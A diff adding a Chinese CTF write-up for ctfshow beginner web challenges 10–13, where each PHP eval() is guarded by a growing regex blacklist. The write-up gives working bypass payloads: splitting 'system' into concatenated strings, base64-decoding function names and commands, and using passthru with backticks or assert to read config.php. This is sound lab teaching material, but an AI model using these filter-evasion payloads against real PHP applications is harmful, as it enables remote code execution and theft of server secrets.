@@ -153,6 +153,45 @@ intval函数是获取变量的整型值，当它获取的变量不能被转换�
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/WL%7D1TDTU%5DP%7D4Y%24202RZGM6T.png" alt=""><br>
 还可以使用exec命令，构造成**?c=exec(‘tac config.php’,$res);var_dump($res);**<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web9/_3BDIKSEX%28%5DA%25QMRU~%29MT%28V.png" alt=""></p>
+<h2 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br></pre></td></tr></table></figure>
+<p>这次是正则匹配不允许使用，所以这里我们就不能直接使用这三个命令，可以采取命令拼接的方式构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;tac config.php&#39;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web10/B_%40%40%5BP_YWOJ7FWSY%5BE%296%29CH.png" alt=""><br>
+成功获取到flag</p>
+<h2 id="web11"><a class="header-anchor" href="#web11">¶</a>web11</h2>
+<p>这次是在前面基础上正则匹配到cat</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br></pre></td></tr></table></figure>
+<p>但我用的是tac，所以依然可以按照上题的解法构造，获取flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;tac config.php&#39;);</span><br></pre></td></tr></table></figure>
+<h2 id="web12"><a class="header-anchor" href="#web12">¶</a>web12</h2>
+<p>这次居然连文件名也过滤了呜呜呜</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br></pre></td></tr></table></figure>
+<p>这波你逼我的，我们利用base64编码进行命令执行<br>
+把system经过base64编码后：c3lzdGVt<br>
+把tac config.php经过base64编码后：dGFjIGNvbmZpZy5waHA=<br>
+所以构成成这样</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);$b&#x3D;base64_decode(&quot;dGFjIGNvbmZpZy5waHA&#x3D;&quot;);$a($b);</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web12/C8BK0DY49JDXZJSGCNB%25Z%5D3.png" alt=""><br>
+成功获取到flag</p>
+<h2 id="web13"><a class="header-anchor" href="#web13">¶</a>web13</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br></pre></td></tr></table></figure>
+<p>这次正则匹配增加了.和；符号，也就意味着我们不能再拼接执行语句了<br>
+不过还有两个命令执行函数passthru()和assert()函数</p>
+<blockquote>
+<p>passthru()直接将结果输出到浏览器<br>
+assert()中如果是字符串，会将其当作php代码执行</p>
+</blockquote>
+<p>使用passthru()<br>
+在linux中，反引号的作用是将执行的内容赋予变量，构造如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;passthru(&#39;tac &#96;ls&#96;&#39;)?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web13/_A1DOADK%40Y2SY7~3A4N5_I5.png" alt=""><br>
+使用assert()<br>
+因为正则表达式的过滤，所以这里还是将system(‘tac config.php’)进行base64编码成c3lzdGVtKCd0YWMgY29uZmlnLnBocCcp<br>
+构造如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;assert(base64_decode(&#39;c3lzdGVtKCd0YWMgY29uZmlnLnBocCcp&#39;))?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web13/H3RUCLH9F2_HW%60%249J%5BWG5UO.png" alt=""><br>
+皆可获取到flag</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
